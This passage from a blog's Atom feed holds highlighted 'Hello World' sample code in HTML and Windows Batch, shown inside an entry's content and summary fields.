class="string">"Hello, World!"</span>)</span><br></pre></td></tr></table></figure><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Bat命令&quot;&gt;&lt;a href=&quot;#Bat命令&quot; class=&quot;headerlink&quot; title=&quot;Bat命令&quot;&gt;&lt;/a&gt;Bat命令&lt;/h3&gt;&lt;figure class=&quot;highlight bat&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; Hello, world!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;pause&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
